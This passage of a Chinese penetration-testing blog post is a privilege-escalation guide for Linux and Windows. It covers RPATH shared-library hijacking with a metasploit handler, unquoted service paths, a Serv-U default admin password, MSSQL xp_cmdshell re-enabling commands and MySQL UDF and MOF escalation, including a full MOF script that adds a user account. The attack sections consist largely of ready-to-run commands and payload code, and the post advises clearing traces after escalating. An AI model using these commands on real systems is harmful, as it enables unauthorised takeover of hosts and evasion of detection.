<p><strong>如何获取Root权限?</strong><br>　　如果攻击者可以用恶意的共享库取代原来的共享库，那么当应用运行时，就可以加载恶意代码，并以运行者的权限运行恶意代码。如果应用是以root用户权限运行的，那么整个主机就沦陷了。<br>　　攻击者可能需要耐心等待应用的运行，或者用社会工程学的技巧来诱导系统管理员执行运行恶意代码的应用。如果应用在开始菜单中被调用，比如cron或者其他进程，那么权限提升利用过程会快很多。</p>
<ul>
<li>用RPATH和弱文件权限编译的二进制文件可以进行root提权。<br>可以用ldd工具来找出使用共享库的二进制文件<br><img src="http://www.4hou.com/uploads/20171222/1513957265171473.png" alt=""><br>当objdump运行时，可以看到它是被/tmp/program/main处的静态RPATH编译的：<br><img src="http://www.4hou.com/uploads/20171222/1513957702873643.png" alt=""><br>/tmp分区默认是可写的，如果创建分区时没有NOEXEC标志，攻击者就可以在contextBinary运行时写入恶意的共享库。在有问题的服务器上，有个root权限的cron任务刚刚执行了有漏洞的二进制文件：<br><img src="http://www.4hou.com/uploads/20171222/1513957762448685.png" alt=""><br>在这个例子中我们用metasploit框架来创建可以在系统上植入的共享库。首先在攻击者的主机上设立handler<br><img src="http://www.4hou.com/uploads/20171222/1513958141771531.png" alt=""><br>这时，恶意库就创建了。利用的第一步是操作系统寻找共享库可以模仿的库：<br><img src="http://www.4hou.com/uploads/20171222/1513958195485836.png" alt=""><br>之前我用msfvenom创建的有相同payload的共享库作为handler：<br><img src="http://www.4hou.com/uploads/20171222/1513958230587933.png" alt=""><br>在被攻击的主机上，创建了目录结构而且库在可写的：<br><img src="http://www.4hou.com/uploads/20171222/1513958348323279.png" alt=""><br>一旦cron任务运行，恶意库就会执行。在metasploit控制台上有以root权限运行的shell会话，如图所示：<br><img src="http://www.4hou.com/uploads/20171222/1513958384790590.png" alt=""></li>
</ul>
<p>Linux提权指南<br><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br>Linux提权辅助脚本<br><a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="external">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a href="https://github.com/HappyTreeFriend/linux-exploit-suggester" target="_blank" rel="external">https://github.com/HappyTreeFriend/linux-exploit-suggester</a><br>LinuxExploits<br><a href="https://github.com/HappyTreeFriend/kernel-exploits" target="_blank" rel="external">https://github.com/HappyTreeFriend/kernel-exploits</a><br>项目：<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="external">https://github.com/NullArray/RootHelper</a></p>
<p><strong>Windows</strong></p>
<ul>
<li>利用exp溢出<br>　　尝试运行已知溢出漏洞的exp来获取system权限。注意shell不能执行命令，EXP可以在exploit-db获取。使用Windows-Exploit-Suggester查看可以执行的EXP</li>
<li>WINDOWS错误系统配置<br>1、检测目标主机是否存在该漏洞<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;</div><div class="line">如果存在一下结果则表示存在：</div><div class="line">FABS - Helping agent for MAGIX media database	 Fabs	C:\Program Files (x86)\Common </div><div class="line">Files\MAGIX Services\Database\bin\FABS.exe /DisableUI     Auto</div></pre></td></tr></table></figure>
</li>
</ul>
<p>或者使用BeRoot工具进行检测。<br>2、检查对有漏洞目录是否有写入的权限。<br>　　使用Windows内建工具icacls查看路径中受影响文件夹的权限，(M)代表修改权限，(F)代表完全控制，(CI)代表从属容器将继承访问控制项，(OI)代表从属文件将继承访问控制项。<br>3、攻击。<br>　　将我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下，然后运行如下命令尝试重启服务，如果失败的话等待服务器重启时执行exe，成功提权后记得清理痕迹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sc stop service_name</div><div class="line">sc start service_name</div></pre></td></tr></table></figure></p>
<p>具体可以学习参考：<a href="http://www.freebuf.com/articles/system/131388.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131388.html</a></p>
<ul>
<li>Windows Services漏洞提权<br>　　Windows系统服务运行在后端，由操作系统通过SCM(服务控制管理)控制，它负责处理所有发送给windows服务的命令，接收windows服务的更新。如果我们能够修改一个服务的二进制文件路径属性，在重启服务的时候，我们可以让服务以system权限替我们启动一个命令。</li>
<li>Serv-U提权<br>　　Ser-u提权可以利用serv-u ftp本地溢出漏洞进行，具体方法用serv-u工具提权生成serv-u提权工具生成serv_u.exe，将其上传到一个盘符执行提权命令。<br>　　也可以用serv-u管理用户来进行提权，serv-u的默认管理端口是43958，只有本地才能连接这个管理端口。Serv-u默认管理账号为LocalAdministrator,默认密码是“#@$ak#.lk;0@P”，这个密码是固定的，如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。如果管理员修改了密码，还可以通过ServUAdmin.exe文件来获取管理账号和密码。现在大马已经集成了Serv-U一键提权<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-25/18787600.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-25/61508929.jpg" alt=""></li>
<li>SQL Server提权<br>SA权限使用xp_cmdshell存储过程进行提权<br>1、开启xp_cmdshell<br>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure &apos;show advanced options&apos;,1//允许修改高级参数</div><div class="line">RECONFIGURE</div><div class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1  //打开xp_cmdshell扩展</div><div class="line">RECONFIGURE</div><div class="line">若开启失败，可能管理员删除了组件，可以通过一下命令恢复</div><div class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</div></pre></td></tr></table></figure>
</li>
</ul>
<p>突破SA的各种困难<br>常见情况恢复执行xp_cmdshell<br>1 未能找到存储过程’master..xpcmdshell’.<br>恢复方法：查询分离器连接后,<br>第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname =’xplog70.dll’declare @o int<br>第二步执行:sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br>然后按F5键命令执行完毕<br>2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br>恢复方法：查询分离器连接后,<br>第一步执行：sp_dropextendedproc “xp_cmdshell”<br>第二步执行：sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br>然后按F5键命令执行完毕<br>3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br>恢复方法：查询分离器连接后,<br>第一步执行:exec sp_dropextendedproc ‘xp_cmdshell’<br>第二步执行:exec sp_addextendedproc ‘xp_cmdshell’,’xpweb70.dll’<br>然后按F5键命令执行完毕<br>2、执行命令<br>exec xp_cmdshell ‘whoami’</p>
<p>db_owner提权：在db_owner所在管理的表里，创建一个触发器，等管理员用sa用户执行插入表命令的时候就会触发，达到提权目的。mssql也可以通过差异备份写脚本到自启动目录下。利用xp_regwrite再注册表里直接加个系统帐号或者直接写个webshell，在主机重起的时候就可以拿到webshell或者系统权限。</p>
<p>在xp_cmdshell被删除或者出错情况下，我们可以利用其它通过SQL Server 执行系统命令的方法来达到提权效果。<br><a href="http://www.cnblogs.com/xiao0/archive/2012/08/09/2630048.html" target="_blank" rel="external">sp_oacreate</a><br><a href="https://evi1cg.me/archives/Exec_OS_Command_Via_MSSQL.html" target="_blank" rel="external">SQL Server CLR</a><br>Microsoft SQL Server 现在具备与 Microsoft Windows .NET Framework 的公共语言运行时 (CLR) 组件集成的功能。<br><a href="https://www.anquanke.com/post/id/84646" target="_blank" rel="external">Agent Job</a><br>此种方式适用于服务器开启了MSSQL Agent Job服务，并且服务器中当前运行的用户账号拥有足够的权限去创建并执行代理作业的情况。<br><a href="https://evi1cg.me/archives/Powerup.html" target="_blank" rel="external">PowerUpSQL</a></p>
<ul>
<li>MYSQL提权<br>利用mysql提权的三种方式均需要获取mysql数据库最高权限root的帐号密码</li>
</ul>
<p>UDF提权：<br>UDF为User Defined Function用户自定义函数，也就是支持用户自定义函数的功能。这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。也就是说我们可以通过编写dll文件来实现我们需要的功能，UDF编写可以参考（<a href="https://www.404sec.com/7817.html）。利用UDF提权需要知道root账户的密码，并且需要目标系统是Windows。用Udf.dll提权原理是利用mysql的自定义函数功能，将mysql账号转化为system权限，但前提是要有一个mysql账号。" target="_blank" rel="external">https://www.404sec.com/7817.html）。利用UDF提权需要知道root账户的密码，并且需要目标系统是Windows。用Udf.dll提权原理是利用mysql的自定义函数功能，将mysql账号转化为system权限，但前提是要有一个mysql账号。</a></p>
<p>在MYSQL 4.1以前的版本中，可以将所有的DLL文件里面的任何函数都注册到MYSQL里面以供MYSQL调用。无论这个DLL在什么位置，函数的声明是什么样的。</p>
<p>在MYSQL 4.1及以后的版本中，对UDF函数进行了限制，只有实现了一个特定接口的函数才可以被成功注册到MYSQL中，这样就防止了通过MYSQL非法调用系统的DLL。</p>
<p>在MYSQL5.0以后，对注册的DLL的位置有了限制，创建函数的时候，所对应的DLL不能包含/或者\，简单的理解就是不能是绝对路径。 所以我们将DLL上传到包含在PATH这个环境变量内的目录中来跳过这个限制(运行echo %path%可以查看可写目录，例如：C:\WINDOWS\udf.dll或C:\WINDOWS\system32\udf.dll)，或者放到盘符的根目录下通过c:udf.dll这种形式的写法来跳过限制。</p>
<p>Mysql5.1及以上版本，必须将DLL文件上传到mysql安装目录下的lib\plugin文件夹下才能创建自定义的函数。默认情况下’plugin’文件夹并不存在，可能就是为了防止通过into dumpfile将DLL来写到这个文件夹。可以用命令show variables like ‘%plugin%’查看是否存在plugin文件夹。可以在webshell中手工创建lib、plugin文件夹，也可以像下面这样利用NTFS ADS流来创建文件夹(5.7.14 权限不足，Errcode: 13 - Permission denied。5.5.8可以。哪些版本可以？)：</p>
<p>具体方法是上传udf.dll至C:\ProgramFiles\MYSQL\MYSQL  Server 5.1\lib\plugin\udf.dll目录，如果mysql版本小于5.1则上传至C:\WINDOWS\uff.dll或C:\WINDOWS\system32\udf.dll，之后可以执行SQL：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Creat funtion myCmd returns string soname “uff.dll”;</div><div class="line">Select MyCmd(“Cmd命令”);</div><div class="line">Drop function Mycmd</div><div class="line">即可获取system权限</div></pre></td></tr></table></figure></p>
<p>MOF提权：<br>MOF是windows管理规范存储库的托管对象格式文件。在mysql提权中，可以找一个可以目录上传mof文件，利用其中的脚本提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">操作系统版本低于Windows Server 2008;</div><div class="line">mysql 版本低于5.7</div></pre></td></tr></table></figure></p>
<p>关于 mof 提权的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
<p>该命令，即是把我们的提权命令导入到 nullevt.mof 。<br>select load_file(“C:/php/APMServ5.2.6/www/htdocs/1.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof”<br><img src="http://www.secist.com/wp-content/uploads/2016/08/20160813085602.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(“\\\\.\\root\\subscription”)</div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">EventNamespace = “Root\\Cimv2”;</div><div class="line">Name = “filtP2”;</div><div class="line">Query = “Select * From __InstanceModificationEvent “</div><div class="line">“Where TargetInstance Isa \”Win32_LocalTime\” “</div><div class="line">“And TargetInstance.Second = 5”;</div><div class="line">QueryLanguage = “WQL”;</div><div class="line">&#125;;</div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">Name = “consPCSV2”;</div><div class="line">ScriptingEngine = “JScript”;</div><div class="line">ScriptText =</div><div class="line">“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user secist 123 /add\”)“;</div><div class="line">&#125;;</div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">Consumer = $Consumer;</div><div class="line">Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>为了更高的成功率，我们必须分开两次导入该脚本！第一次为用户添加命令，第二次为用户提权</p>
<p>启动项/组策略:<br>windows 启动项和开关机组策略目录下的脚本会在用户登录、开机、关机是自动运行，利用mysql向这些路径导出脚本即可执行任意命令，mysql5.7开始默认使用secure-file-priv选项，不能随意选择导出路径，所以这种办法需要目标mysql版本低于5.7。</p>
<ul>
<li>Oracle提权<br>DBA权限，利用java访问文件系如果oracle服务是administrator账户启动的，只有一个具有resource和connect权限的数据库账户，就能利用metasploit和smbrelay功能，本地搭建一个服务器来取得系统的访问权限统执行命令：<a href="http://huaidan.org/archives/3154.html" target="_blank" rel="external">案例</a></li>
</ul>
<p><a href="http://www.freebuf.com/articles/system/53987.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/53987.html</a></p>
<ul>
<li><p>探测其他脚本是否支持<br>有PHP脚本执行就可能是system权限，或者看本机有没有tocat用jspshell，权限就有可能是system.</p>
</li>
<li><p>Pcanywhere提权<br>获得webshell后若是能顺利跳转至C:/Document and SettingAll/UsersApplicationData/SymantecpcAnywhere/下，就可以下载CIF文件，然后使用相关工具读出密码。</p>
</li>
<li><p>星外提权<br>首先要能识别主机是否使用了星外虚拟祝你管理系统，可以通过查看网站目录，看其中是否有freehost目录或者星外安装目录，当然可以通过phpinfo识别。<br>识别出安装星外虚拟主机管理系统之后，如果有可读可写的目录或者文件，可以直接上传cmd和星外读IIS，运行IIS.exe -i和IIS.exe -u[FreeHost ID]即可获取得密码</p>
</li>
</ul>
<p>Windows提权指南<br><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">http://www.fuzzysecurity.com/tutorials/16.html</a><br>Windows提权辅助脚本<br><a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="external">https://github.com/pentestmonkey/windows-privesc-check</a><br>WindowsExploits<br><a href="https://github.com/abatchy17/WindowsExploits" target="_blank" rel="external">https://github.com/abatchy17/WindowsExploits</a></p>
<p>参考链接：<br><a href="https://www.anquanke.com/post/id/85377" target="_blank" rel="external">渗透测试技术之另类Windows提权</a><br><a href="http://www.freebuf.com/vuls/87463.html" target="_blank" rel="external">Windows提权的几种姿势</a><br><a href="http://www.freebuf.com/articles/web/55577.html" target="_blank" rel="external">技术分享：MSSQL注入xp_cmdshell</a><br><a href="http://www.freebuf.com/column/142307.html" target="_blank" rel="external">详述MSSQL服务在渗透测试中的利用</a><br><a href="http://www.freebuf.com/articles/system/53987.html" target="_blank" rel="external">一个人的武林：内网渗透测试思路（二）</a><br><a href="https://evi1cg.me/archives/SUID_Privilege_Escalation.html" target="_blank" rel="external">SUID Privilege Escalation</a><br><a href="http://bobao.360.cn/learning/detail/2984.html" target="_blank" rel="external">实战Linux下三种不同方式的提权技巧</a><br><a href="http://www.freebuf.com/articles/system/129549.html" target="_blank" rel="external">Linux提权：从入门到放弃</a><br><a href="http://www.4hou.com/system/9436.html" target="_blank" rel="external">利用动态链接共享对象库进行Linux提权</a>    </p>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    Hello_C
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://yoursite.com/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html" title="渗透测试-03权限提升与内网渗透">http://yoursite.com/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/渗透/2017/12/03/渗透测试-02漏洞查找与利用.html" rel="next" title="渗透测试--02漏洞查找与利用">
                <i class="fa fa-chevron-left"></i> 渗透测试--02漏洞查找与利用
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/CTF/2018/01/14/上传绕过WAF的tips大全.html" rel="prev" title="上传绕过WAF的tips大全">
                上传绕过WAF的tips大全 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
        
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div class="ds-thread" data-thread-key="渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html"
           data-title="渗透测试-03权限提升与内网渗透" data-url="http://yoursite.com/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html">
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="Hello_C" />
            
              <p class="site-author-name" itemprop="name">Hello_C</p>
              <p class="site-description motion-element" itemprop="description">渗透测试  网络安全   web</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">72</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/zjwfc" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.dropsec.xyz" title="Drops团队主页" target="_blank">Drops团队主页</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fgp.dropsec.xyz" title="F.G.PNotes" target="_blank">F.G.PNotes</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://lyx.dropsec.xyz" title="lazy" target="_blank">lazy</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://byd.dropsec.xyz" title="Joy_nick" target="_blank">Joy_nick</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://wkh.dropsec.xyz" title="X加油,未来" target="_blank">X加油,未来</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://jdrops.dropsec.xyz" title="J_Drops" target="_blank">J_Drops</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://lzx.dropsec.xyz" title="凡尘" target="_blank">凡尘</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://cq.dropsec.xyz" title="qiqi" target="_blank">qiqi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://yunnigu.dropsec.xyz" title="云" target="_blank">云</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://isron.cn" title="Isron" target="_blank">Isron</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://klionsec.github.io" title="klion" target="_blank">klion</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.myh0st.cn" title="信安之路" target="_blank">信安之路</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.te7m.cn" title="周丹" target="_blank">周丹</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-信息搜集"><span class="nav-number">1.</span> <span class="nav-text">0x01 信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-提权方法"><span class="nav-number">2.</span> <span class="nav-text">0x02 提权方法</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Hello_C</span>
  
  <span class="site-pv">
   <script src="http://s6.cnzz.com/stat.php?id=1261655448&web_id=1261655448" type="text/javascript"></script>
  </span>
  
  <span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
  </span>
  <span id="busuanzi_container_site_uv">
    本站访客数<span id="busuanzi_value_site_uv"></span>人次
  </span>
</div>
<!-- time -->
  <div id="show-time">
    <span id="span_dt_dt"></span>
  </div>
  <script>
      function show_date_time() {
        window.setTimeout("show_date_time()", 1000);
        BirthDay = new Date("9/1/2016 15:30:01");
        today = new Date();
        //总时间
        timeold = (today.getTime() - BirthDay.getTime());
        sectimeold = timeold / 1000
        secondsold = Math.floor(sectimeold);
        msPerDay = 24 * 60 * 60 * 1000
        e_daysold = timeold / msPerDay
        daysold = Math.floor(e_daysold);
        e_hrsold = (e_daysold - daysold) * 24;
        hrsold = Math.floor(e_hrsold);
        e_minsold = (e_hrsold - hrsold) * 60;
        minsold = Math.floor((e_hrsold - hrsold) * 60);
        seconds = Math.floor((e_minsold - minsold) * 60);
        span_dt_dt.innerHTML = "本站已安全运行 " + daysold + " 天 " + hrsold + " 小时 " + minsold + " 分 " + seconds + " 秒";
      }
     show_date_time();
  </script>



        







  <div style="display: none;">
    <script src="//s95.cnzz.com/z_stat.php?id=1261655448&web_id=1261655448" language="JavaScript"></script>
  </div>



        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>
  
  <!-- 页面点击小红心 --> 
  <script type="text/javascript" src="/js/src/love.js"></script>
  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"zjwfc"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.id = 'duoshuo-script';
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>

  
    
    
    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
    <script src="/js/src/hook-duoshuo.js"></script>
  
















  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'CwxGhh9VgiFuj6LH48704Fac-gzGzoHsz',
        appKey: 'XUfjKkLfgSzMk7icjPaT0SsL',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  

  

  
  

  

  

  

</body>
</html>
